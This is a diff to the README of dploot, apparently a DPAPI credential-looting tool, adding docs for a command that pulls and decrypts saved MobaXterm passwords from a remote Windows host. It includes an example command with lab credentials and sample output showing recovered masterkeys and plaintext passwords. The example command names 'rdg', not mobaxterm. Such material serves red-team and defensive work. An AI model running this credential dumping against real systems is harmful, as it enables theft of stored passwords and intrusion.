@@ -34,6 +34,7 @@ If you don't know what is DPAPI, [check out this post](https://posts.specterops.
       - [wifi](#wifi)
       - [sccm](#sccm)
       - [backupkey](#backupkey)
+      - [mobaxterm](#mobaxterm)
   - [Credits](#credits)
   - [TODO](#TODO)
 
@@ -713,6 +714,33 @@ PRIVATEKEYBLOB:{1ef1b5b000000000010000000000000000000000940400000702000000a40000
 
 
 [-] Exporting domain backupkey to file key.pvk
+```
+
+### mobaxterm
+
+The **mobaxterm** command will extract MobaXterm secrets and masterpassword key from hive (HKU) and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys. If the user is not connected on the remote target, dploot will download and extract secrets from NTUSER.dat. 
+
+With `pvk`:
+
+```text
+dploot rdg -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -pvk key.pvk
+[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
+
+[*] Triage ALL USERS masterkeys
+
+{6dedb662-3f3c-43a7-bfc4-e2990a48d4dd}:32c4eeeac475910a33f531b56cf9d73f35490d5e
+{21f17bcd-eac1-4187-9538-a744f2c6e17b}:198eba83e088a59fd75e6435b38804d4973a2c1e
+
+[*] Triage MobaXterm Secrets
+
+[MOBAXTERM CREDENTIAL]
+Name:		TEST
+Username:	user
+Password:	waza1234
+
+[MOBAXTERM PASSWORD]
+Username:	mobauser@mobaserver
+Password:	309554moba231082pass322883
 ```
 
 ## Credits
